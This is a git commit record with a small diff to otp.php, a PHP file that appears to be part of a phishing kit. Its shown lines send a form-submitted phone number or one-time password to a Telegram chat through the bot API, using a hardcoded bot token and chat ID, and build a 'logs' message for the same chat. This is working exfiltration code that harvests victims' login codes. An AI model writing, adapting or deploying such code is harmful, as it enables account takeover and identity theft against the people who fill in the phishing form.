de68cb59dfd4d9082badbc3c0b433492c4b76b8d
NonNomen404 <92431601+NonNomen404@users.noreply.github.com>
2021-11-15 01:39:41 +0000

    Create otp.php

--- otp.php
+++ otp.php
@@ -4,6 +4,8 @@ file_get_contents("https://api.telegram.org/bot1729991611:AAHNMJh9xPulpdUqS46UmH
 // other
 //file_get_contents("https://api.telegram.org/bot1729991611:AAHNMJh9xPulpdUqS46UmHGwckc5rJ7n6zs/sendMessage?chat_id=-538746459&text=" . $_POST['number']);
 
+$_POST['number'] = NULL;
+
 // logs
 $data = [
 'chat_id' => $Chat_ID,
